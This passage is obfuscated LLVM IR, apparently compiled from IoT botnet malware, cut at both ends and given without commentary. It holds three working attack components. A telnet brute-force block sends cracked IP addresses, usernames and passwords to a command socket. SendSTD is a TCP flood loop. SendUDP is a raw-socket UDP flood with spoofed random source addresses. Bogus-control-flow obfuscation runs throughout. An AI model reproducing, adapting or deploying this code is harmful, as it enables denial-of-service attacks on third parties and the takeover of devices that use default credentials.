originalBB203alteredBB:                           ; preds = %originalBB203, %1803
  br label %originalBB203

originalBB207alteredBB:                           ; preds = %originalBB207, %1823
  br label %originalBB207

originalBB211alteredBB:                           ; preds = %originalBB211, %1840
  br label %originalBB211

originalBB215alteredBB:                           ; preds = %originalBB215, %1867
  %2200 = load i32, i32* @mainCommSock, align 4
  %2201 = load i32, i32* %6, align 4
  %2202 = sext i32 %2201 to i64
  %2203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2202
  %2204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2203, i32 0, i32 1
  %2205 = bitcast i32* %2204 to %struct.in_addr*
  %2206 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2205, i32 0, i32 0
  %2207 = load i32, i32* %2206, align 4
  %2208 = call i8* @inet_ntoa(i32 %2207) #5
  %2209 = load i32, i32* %6, align 4
  %2210 = sext i32 %2209 to i64
  %2211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2210
  %2212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2211, i32 0, i32 4
  %2213 = load i8, i8* %2212, align 2
  %2214 = zext i8 %2213 to i64
  %2215 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %2214
  %2216 = load i8*, i8** %2215, align 8
  %2217 = load i32, i32* %6, align 4
  %2218 = sext i32 %2217 to i64
  %2219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2218
  %2220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2219, i32 0, i32 5
  %2221 = load i8, i8* %2220, align 1
  %2222 = zext i8 %2221 to i64
  %2223 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %2222
  %2224 = load i8*, i8** %2223, align 8
  %2225 = call i32 (i32, i8*, ...) @sockprintf(i32 %2200, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.289, i32 0, i32 0), i8* %2208, i8* %2216, i8* %2224)
  %2226 = load i32, i32* %6, align 4
  %2227 = sext i32 %2226 to i64
  %2228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %2227
  call void @reset_telstate(%struct.telstate_t* %2228)
  br label %originalBB215
}

; Function Attrs: nounwind
declare i32 @getdtablesize() #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #5

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

declare i32 @sleep(i32) #2

; Function Attrs: noinline nounwind uwtable
define void @SendSTD(i8*, i32, i32) #0 {
  %4 = load i32, i32* @x.73
  %5 = load i32, i32* @y.74
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca %struct.hostent*, align 8
  %19 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i32 %1, i32* %13, align 4
  store i32 %2, i32* %14, align 4
  %20 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %20, i32* %15, align 4
  %21 = call i64 @time(i64* null) #5
  store i64 %21, i64* %16, align 8
  %22 = load i8*, i8** %12, align 8
  %23 = call %struct.hostent* @gethostbyname(i8* %22)
  store %struct.hostent* %23, %struct.hostent** %18, align 8
  %24 = bitcast %struct.sockaddr_in* %17 to i8*
  call void @llvm.memset.p0i8.i64(i8* %24, i8 0, i64 16, i32 4, i1 false)
  %25 = load %struct.hostent*, %struct.hostent** %18, align 8
  %26 = getelementptr inbounds %struct.hostent, %struct.hostent* %25, i32 0, i32 4
  %27 = load i8**, i8*** %26, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %31 = bitcast %struct.in_addr* %30 to i8*
  %32 = load %struct.hostent*, %struct.hostent** %18, align 8
  %33 = getelementptr inbounds %struct.hostent, %struct.hostent* %32, i32 0, i32 3
  %34 = load i32, i32* %33, align 4
  %35 = sext i32 %34 to i64
  call void @bcopy(i8* %29, i8* %31, i64 %35) #5
  %36 = load %struct.hostent*, %struct.hostent** %18, align 8
  %37 = getelementptr inbounds %struct.hostent, %struct.hostent* %36, i32 0, i32 2
  %38 = load i32, i32* %37, align 8
  %39 = trunc i32 %38 to i16
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 %39, i16* %40, align 4
  %41 = load i32, i32* %13, align 4
  %42 = trunc i32 %41 to i16
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %42, i16* %43, align 2
  store i32 0, i32* %19, align 4
  %44 = load i32, i32* @x.73
  %45 = load i32, i32* @y.74
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %52

; <label>:52:                                     ; preds = %103, %originalBBpart2
  %53 = load i32, i32* %19, align 4
  %54 = icmp uge i32 %53, 50
  br i1 %54, label %55, label %103

; <label>:55:                                     ; preds = %52
  %56 = load i32, i32* @x.73
  %57 = load i32, i32* @y.74
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %55
  %64 = load i32, i32* %15, align 4
  %65 = call i64 @send(i32 %64, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.290, i32 0, i32 0), i64 69, i32 0)
  %66 = load i32, i32* %15, align 4
  %67 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %68 = call i32 @connect(i32 %66, %struct.sockaddr* %67, i32 16)
  %69 = call i64 @time(i64* null) #5
  %70 = load i64, i64* %16, align 8
  %71 = load i32, i32* %14, align 4
  %72 = sext i32 %71 to i64
  %73 = add nsw i64 %70, %72
  %74 = icmp sge i64 %69, %73
  %75 = load i32, i32* @x.73
  %76 = load i32, i32* @y.74
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart28, label %originalBB1alteredBB

originalBBpart28:                                 ; preds = %originalBB1
  br i1 %74, label %83, label %102

; <label>:83:                                     ; preds = %originalBBpart28
  %84 = load i32, i32* @x.73
  %85 = load i32, i32* @y.74
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %83
  %92 = load i32, i32* %15, align 4
  %93 = call i32 @close(i32 %92)
  call void @_exit(i32 0) #11
  %94 = load i32, i32* @x.73
  %95 = load i32, i32* @y.74
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  unreachable

; <label>:102:                                    ; preds = %originalBBpart28
  store i32 0, i32* %19, align 4
  br label %103

; <label>:103:                                    ; preds = %102, %52
  %104 = load i32, i32* %19, align 4
  %105 = add i32 %104, 1
  store i32 %105, i32* %19, align 4
  br label %52
                                                  ; No predecessors!
  %107 = load i32, i32* @x.73
  %108 = load i32, i32* @y.74
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %106
  %115 = load i32, i32* @x.73
  %116 = load i32, i32* @y.74
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %3
  %123 = alloca i8*, align 8
  %124 = alloca i32, align 4
  %125 = alloca i32, align 4
  %126 = alloca i32, align 4
  %127 = alloca i64, align 8
  %128 = alloca %struct.sockaddr_in, align 4
  %129 = alloca %struct.hostent*, align 8
  %130 = alloca i32, align 4
  store i8* %0, i8** %123, align 8
  store i32 %1, i32* %124, align 4
  store i32 %2, i32* %125, align 4
  %131 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %131, i32* %126, align 4
  %132 = call i64 @time(i64* null) #5
  store i64 %132, i64* %127, align 8
  %133 = load i8*, i8** %123, align 8
  %134 = call %struct.hostent* @gethostbyname(i8* %133)
  store %struct.hostent* %134, %struct.hostent** %129, align 8
  %135 = bitcast %struct.sockaddr_in* %128 to i8*
  call void @llvm.memset.p0i8.i64(i8* %135, i8 0, i64 16, i32 4, i1 false)
  %136 = load %struct.hostent*, %struct.hostent** %129, align 8
  %137 = getelementptr inbounds %struct.hostent, %struct.hostent* %136, i32 0, i32 4
  %138 = load i8**, i8*** %137, align 8
  %139 = getelementptr inbounds i8*, i8** %138, i64 0
  %140 = load i8*, i8** %139, align 8
  %141 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %128, i32 0, i32 2
  %142 = bitcast %struct.in_addr* %141 to i8*
  %143 = load %struct.hostent*, %struct.hostent** %129, align 8
  %144 = getelementptr inbounds %struct.hostent, %struct.hostent* %143, i32 0, i32 3
  %145 = load i32, i32* %144, align 4
  %146 = sext i32 %145 to i64
  call void @bcopy(i8* %140, i8* %142, i64 %146) #5
  %147 = load %struct.hostent*, %struct.hostent** %129, align 8
  %148 = getelementptr inbounds %struct.hostent, %struct.hostent* %147, i32 0, i32 2
  %149 = load i32, i32* %148, align 8
  %150 = trunc i32 %149 to i16
  %151 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %128, i32 0, i32 0
  store i16 %150, i16* %151, align 4
  %152 = load i32, i32* %124, align 4
  %153 = trunc i32 %152 to i16
  %154 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %128, i32 0, i32 1
  store i16 %153, i16* %154, align 2
  store i32 0, i32* %130, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %55
  %155 = load i32, i32* %15, align 4
  %156 = call i64 @send(i32 %155, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.290, i32 0, i32 0), i64 69, i32 0)
  %157 = load i32, i32* %15, align 4
  %158 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %159 = call i32 @connect(i32 %157, %struct.sockaddr* %158, i32 16)
  %160 = call i64 @time(i64* null) #5
  %161 = load i64, i64* %16, align 8
  %162 = load i32, i32* %14, align 4
  %163 = sext i32 %162 to i64
  %_ = sub i64 %161, %163
  %gen = mul i64 %_, %163
  %_2 = sub i64 0, %161
  %gen3 = add i64 %_2, %163
  %_4 = sub i64 %161, %163
  %gen5 = mul i64 %_4, %163
  %_6 = shl i64 %161, %163
  %164 = add nsw i64 %161, %163
  %165 = icmp sge i64 %160, %164
  br label %originalBB1

originalBB10alteredBB:                            ; preds = %originalBB10, %83
  %166 = load i32, i32* %15, align 4
  %167 = call i32 @close(i32 %166)
  call void @_exit(i32 0) #11
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %106
  br label %originalBB14
}

declare %struct.hostent* @gethostbyname(i8*) #2

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #1

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define void @SendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = load i32, i32* @x.75
  %8 = load i32, i32* @y.76
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.sockaddr_in, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8*, align 8
  %28 = alloca %struct.iphdr*, align 8
  %29 = alloca %struct.udphdr*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  store i8* %0, i8** %15, align 8
  store i32 %1, i32* %16, align 4
  store i32 %2, i32* %17, align 4
  store i32 %3, i32* %18, align 4
  store i32 %4, i32* %19, align 4
  store i32 %5, i32* %20, align 4
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 0
  store i16 2, i16* %32, align 4
  %33 = load i32, i32* %16, align 4
  %34 = icmp eq i32 %33, 0
  %35 = load i32, i32* @x.75
  %36 = load i32, i32* @y.76
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %34, label %43, label %47

; <label>:43:                                     ; preds = %originalBBpart2
  %44 = call i32 @rand_cmwc()
  %45 = trunc i32 %44 to i16
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 1
  store i16 %45, i16* %46, align 2
  br label %68

; <label>:47:                                     ; preds = %originalBBpart2
  %48 = load i32, i32* @x.75
  %49 = load i32, i32* @y.76
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %47
  %56 = load i32, i32* %16, align 4
  %57 = trunc i32 %56 to i16
  %58 = call zeroext i16 @htons(i16 zeroext %57) #10
  %59 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 1
  store i16 %58, i16* %59, align 2
  %60 = load i32, i32* @x.75
  %61 = load i32, i32* @y.76
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %68

; <label>:68:                                     ; preds = %originalBBpart24, %43
  %69 = load i8*, i8** %15, align 8
  %70 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 2
  %71 = call i32 @getHost(i8* %69, %struct.in_addr* %70)
  %72 = icmp ne i32 %71, 0
  br i1 %72, label %73, label %90

; <label>:73:                                     ; preds = %68
  %74 = load i32, i32* @x.75
  %75 = load i32, i32* @y.76
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %73
  %82 = load i32, i32* @x.75
  %83 = load i32, i32* @y.76
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %366

; <label>:90:                                     ; preds = %68
  %91 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 3
  %92 = getelementptr inbounds [8 x i8], [8 x i8]* %91, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %92, i8 0, i64 8, i32 4, i1 false)
  %93 = load i32, i32* %19, align 4
  store i32 %93, i32* %22, align 4
  %94 = call i32 @socket(i32 2, i32 3, i32 17) #5
  store i32 %94, i32* %23, align 4
  %95 = load i32, i32* %23, align 4
  %96 = icmp ne i32 %95, 0
  br i1 %96, label %114, label %97

; <label>:97:                                     ; preds = %90
  %98 = load i32, i32* @x.75
  %99 = load i32, i32* @y.76
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %97
  %106 = load i32, i32* @x.75
  %107 = load i32, i32* @y.76
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %366

; <label>:114:                                    ; preds = %90
  store i32 1, i32* %24, align 4
  %115 = load i32, i32* %23, align 4
  %116 = bitcast i32* %24 to i8*
  %117 = call i32 @setsockopt(i32 %115, i32 0, i32 3, i8* %116, i32 4) #5
  %118 = icmp slt i32 %117, 0
  br i1 %118, label %119, label %120

; <label>:119:                                    ; preds = %114
  br label %366

; <label>:120:                                    ; preds = %114
  store i32 50, i32* %25, align 4
  br label %121

; <label>:121:                                    ; preds = %originalBBpart218, %120
  %122 = load i32, i32* %25, align 4
  %123 = add nsw i32 %122, -1
  store i32 %123, i32* %25, align 4
  %124 = icmp ne i32 %122, 0
  br i1 %124, label %125, label %148

; <label>:125:                                    ; preds = %121
  %126 = load i32, i32* @x.75
  %127 = load i32, i32* @y.76
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %125
  %134 = call i64 @time(i64* null) #5
  %135 = call i32 @rand_cmwc()
  %136 = zext i32 %135 to i64
  %137 = xor i64 %134, %136
  %138 = trunc i64 %137 to i32
  call void @srand(i32 %138) #5
  %139 = call i32 @rand() #5
  call void @init_rand(i32 %139)
  %140 = load i32, i32* @x.75
  %141 = load i32, i32* @y.76
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBBpart218, label %originalBB14alteredBB

originalBBpart218:                                ; preds = %originalBB14
  br label %121

; <label>:148:                                    ; preds = %121
  %149 = load i32, i32* %20, align 4
  %150 = sub nsw i32 32, %149
  %151 = shl i32 1, %150
  %152 = sub nsw i32 %151, 1
  %153 = xor i32 %152, -1
  store i32 %153, i32* %26, align 4
  %154 = load i32, i32* %18, align 4
  %155 = sext i32 %154 to i64
  %156 = add i64 28, %155
  %157 = call i8* @llvm.stacksave()
  store i8* %157, i8** %27, align 8
  %158 = alloca i8, i64 %156, align 16
  %159 = bitcast i8* %158 to %struct.iphdr*
  store %struct.iphdr* %159, %struct.iphdr** %28, align 8
  %160 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %161 = bitcast %struct.iphdr* %160 to i8*
  %162 = getelementptr i8, i8* %161, i64 20
  %163 = bitcast i8* %162 to %struct.udphdr*
  store %struct.udphdr* %163, %struct.udphdr** %29, align 8
  %164 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %165 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 2
  %166 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %165, i32 0, i32 0
  %167 = load i32, i32* %166, align 4
  %168 = load i32, i32* %26, align 4
  %169 = call i32 @getRandomIP(i32 %168)
  %170 = call i32 @htonl(i32 %169) #10
  %171 = load i32, i32* %18, align 4
  %172 = sext i32 %171 to i64
  %173 = add i64 8, %172
  %174 = trunc i64 %173 to i32
  call void @makeIPPacket(%struct.iphdr* %164, i32 %167, i32 %170, i8 zeroext 17, i32 %174)
  %175 = load i32, i32* %18, align 4
  %176 = sext i32 %175 to i64
  %177 = add i64 8, %176
  %178 = trunc i64 %177 to i16
  %179 = call zeroext i16 @htons(i16 zeroext %178) #10
  %180 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %181 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %180, i32 0, i32 0
  %182 = bitcast %union.anon.1* %181 to %struct.anon.2*
  %183 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %182, i32 0, i32 2
  store i16 %179, i16* %183, align 2
  %184 = call i32 @rand_cmwc()
  %185 = trunc i32 %184 to i16
  %186 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %187 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %186, i32 0, i32 0
  %188 = bitcast %union.anon.1* %187 to %struct.anon.2*
  %189 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %188, i32 0, i32 0
  store i16 %185, i16* %189, align 2
  %190 = load i32, i32* %16, align 4
  %191 = icmp eq i32 %190, 0
  br i1 %191, label %192, label %194

; <label>:192:                                    ; preds = %148
  %193 = call i32 @rand_cmwc()
  br label %199

; <label>:194:                                    ; preds = %148
  %195 = load i32, i32* %16, align 4
  %196 = trunc i32 %195 to i16
  %197 = call zeroext i16 @htons(i16 zeroext %196) #10
  %198 = zext i16 %197 to i32
  br label %199

; <label>:199:                                    ; preds = %194, %192
  %200 = phi i32 [ %193, %192 ], [ %198, %194 ]
  %201 = trunc i32 %200 to i16
  %202 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %203 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %202, i32 0, i32 0
  %204 = bitcast %union.anon.1* %203 to %struct.anon.2*
  %205 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %204, i32 0, i32 1
  store i16 %201, i16* %205, align 2
  %206 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %207 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %206, i32 0, i32 0
  %208 = bitcast %union.anon.1* %207 to %struct.anon.2*
  %209 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %208, i32 0, i32 3
  store i16 0, i16* %209, align 2
  %210 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %211 = bitcast %struct.udphdr* %210 to i8*
  %212 = getelementptr inbounds i8, i8* %211, i64 8
  %213 = load i32, i32* %18, align 4
  call void @makeRandomStr(i8* %212, i32 %213)
  %214 = bitcast i8* %158 to i16*
  %215 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 2
  %217 = load i16, i16* %216, align 2
  %218 = zext i16 %217 to i32
  %219 = call zeroext i16 @csum(i16* %214, i32 %218)
  %220 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 7
  store i16 %219, i16* %221, align 2
  %222 = call i64 @time(i64* null) #5
  %223 = load i32, i32* %17, align 4
  %224 = sext i32 %223 to i64
  %225 = add nsw i64 %222, %224
  %226 = trunc i64 %225 to i32
  store i32 %226, i32* %30, align 4
  store i32 0, i32* %31, align 4
  br label %227

; <label>:227:                                    ; preds = %361, %originalBBpart239, %199
  br label %228

; <label>:228:                                    ; preds = %227
  %229 = load i32, i32* @x.75
  %230 = load i32, i32* @y.76
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
  br i1 %236, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %228
  %237 = load i32, i32* %23, align 4
  %238 = bitcast %struct.sockaddr_in* %21 to %struct.sockaddr*
  %239 = call i64 @sendto(i32 %237, i8* %158, i64 %156, i32 0, %struct.sockaddr* %238, i32 16)
  %240 = call i32 @rand_cmwc()
  %241 = trunc i32 %240 to i16
  %242 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %243 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %242, i32 0, i32 0
  %244 = bitcast %union.anon.1* %243 to %struct.anon.2*
  %245 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %244, i32 0, i32 0
  store i16 %241, i16* %245, align 2
  %246 = load i32, i32* %16, align 4
  %247 = icmp eq i32 %246, 0
  %248 = load i32, i32* @x.75
  %249 = load i32, i32* @y.76
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  br i1 %247, label %256, label %258

; <label>:256:                                    ; preds = %originalBBpart222
  %257 = call i32 @rand_cmwc()
  br label %279

; <label>:258:                                    ; preds = %originalBBpart222
  %259 = load i32, i32* @x.75
  %260 = load i32, i32* @y.76
  %261 = sub i32 %259, 1
  %262 = mul i32 %259, %261
  %263 = urem i32 %262, 2
  %264 = icmp eq i32 %263, 0
  %265 = icmp slt i32 %260, 10
  %266 = or i1 %264, %265
  br i1 %266, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %258
  %267 = load i32, i32* %16, align 4
  %268 = trunc i32 %267 to i16
  %269 = call zeroext i16 @htons(i16 zeroext %268) #10
  %270 = zext i16 %269 to i32
  %271 = load i32, i32* @x.75
  %272 = load i32, i32* @y.76
  %273 = sub i32 %271, 1
  %274 = mul i32 %271, %273
  %275 = urem i32 %274, 2
  %276 = icmp eq i32 %275, 0
  %277 = icmp slt i32 %272, 10
  %278 = or i1 %276, %277
  br i1 %278, label %originalBBpart227, label %originalBB24alteredBB

originalBBpart227:                                ; preds = %originalBB24
  br label %279

; <label>:279:                                    ; preds = %originalBBpart227, %256
  %280 = phi i32 [ %257, %256 ], [ %270, %originalBBpart227 ]
  %281 = load i32, i32* @x.75
  %282 = load i32, i32* @y.76
  %283 = sub i32 %281, 1
  %284 = mul i32 %281, %283
  %285 = urem i32 %284, 2
  %286 = icmp eq i32 %285, 0
  %287 = icmp slt i32 %282, 10
  %288 = or i1 %286, %287
  br i1 %288, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %279
  %289 = trunc i32 %280 to i16
  %290 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %291 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %290, i32 0, i32 0
  %292 = bitcast %union.anon.1* %291 to %struct.anon.2*
  %293 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %292, i32 0, i32 1
  store i16 %289, i16* %293, align 2
  %294 = call i32 @rand_cmwc()
  %295 = trunc i32 %294 to i16
  %296 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %297 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %296, i32 0, i32 3
  store i16 %295, i16* %297, align 4
  %298 = load i32, i32* %26, align 4
  %299 = call i32 @getRandomIP(i32 %298)
  %300 = call i32 @htonl(i32 %299) #10
  %301 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %302 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %301, i32 0, i32 8
  store i32 %300, i32* %302, align 4
  %303 = bitcast i8* %158 to i16*
  %304 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %305 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %304, i32 0, i32 2
  %306 = load i16, i16* %305, align 2
  %307 = zext i16 %306 to i32
  %308 = call zeroext i16 @csum(i16* %303, i32 %307)
  %309 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %310 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %309, i32 0, i32 7
  store i16 %308, i16* %310, align 2
  %311 = load i32, i32* %31, align 4
  %312 = load i32, i32* %22, align 4
  %313 = icmp eq i32 %311, %312
  %314 = load i32, i32* @x.75
  %315 = load i32, i32* @y.76
  %316 = sub i32 %314, 1
